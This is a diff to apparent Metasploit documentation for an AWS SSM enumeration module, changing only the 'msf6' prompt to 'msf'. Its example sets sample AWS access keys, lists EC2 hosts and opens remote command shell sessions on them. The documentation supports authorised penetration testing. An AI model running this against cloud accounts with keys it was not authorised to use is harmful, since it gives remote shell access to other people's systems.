@@ -36,11 +36,11 @@ Create a new session for every successful login.
 Enumerating EC2 instances in the US-East-2 region and opening a session on each one (`CreateSession` is True).
 
 ```
-msf6 auxiliary(cloud/aws/enum_ssm) > set ACCESS_KEY_ID AKIAO5WK2W9TMZT7EAM5
+msf auxiliary(cloud/aws/enum_ssm) > set ACCESS_KEY_ID AKIAO5WK2W9TMZT7EAM5
 ACCESS_KEY_ID => AKIAO5WK2W9TMZT7EAM5
-msf6 auxiliary(cloud/aws/enum_ssm) > set SECRET_ACCESS_KEY pDNhoEPuubvWSsp18axjPFBM4sNme6vnNUFb6qWo
+msf auxiliary(cloud/aws/enum_ssm) > set SECRET_ACCESS_KEY pDNhoEPuubvWSsp18axjPFBM4sNme6vnNUFb6qWo
 SECRET_ACCESS_KEY => pDNhoEPuubvWSsp18axjPFBM4sNme6vnNUFb6qWo
-msf6 auxiliary(cloud/aws/enum_ssm) > run
+msf auxiliary(cloud/aws/enum_ssm) > run
 
 [*] Checking us-east-2...
 [+] Found AWS SSM host i-02cd668d50587bdcf (ip-172-31-42-215.us-east-2.compute.internal) - 172.31.42.215
@@ -48,5 +48,5 @@ msf6 auxiliary(cloud/aws/enum_ssm) > run
 [+] Found AWS SSM host i-074187bde1453613a (EC2AMAZ-HM7U6TS.WORKGROUP) - 172.31.44.170
 [*] AWS SSM command shell session 4 opened (192.168.250.134:37231 -> 172.31.44.170:0) at 2023-05-22 16:43:05 -0400
 [*] Auxiliary module execution completed
-msf6 auxiliary(cloud/aws/enum_ssm) > 
+msf auxiliary(cloud/aws/enum_ssm) > 
 ```
